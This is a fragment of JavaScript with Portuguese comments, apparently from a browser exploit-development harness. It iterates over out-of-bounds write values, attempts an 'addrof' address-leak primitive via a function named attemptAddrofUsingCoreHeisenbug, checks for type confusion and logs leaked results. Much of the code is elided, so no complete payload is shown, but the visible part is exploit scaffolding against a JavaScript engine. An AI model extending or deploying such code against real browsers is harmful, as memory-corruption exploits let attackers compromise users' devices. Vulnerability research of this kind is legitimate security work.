...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R21() { 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        ...
        try { 
            ...
            try {
                const core_addrof_res = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A); // Usa a R21 do core_exploit
                logS3(`  Addrof Core R21: Resultado: ${JSON.stringify(core_addrof_res)}`, "leak");
                if(core_addrof_res){ /* ... (lógica de análise como na R20, adaptando logs para R21) ... */ 
        ...
        if (iter_addrof_core_result.success) { // Prioridade máxima: addrof da Fase 2 funcionou
            best_result_for_runner = { ...current_iter_summary }; // Usa todos os dados desta iteração
        } else if (heisenbugConfirmedThisIter) { 
            // Se Fase 1 TC OK, e ainda não temos um addrof da Fase 2 bem-sucedido (ou oob_value_used não foi setado)
            if (!best_result_for_runner.addrof_A_result_core_func.success || !best_result_for_runner.oob_value_used) {
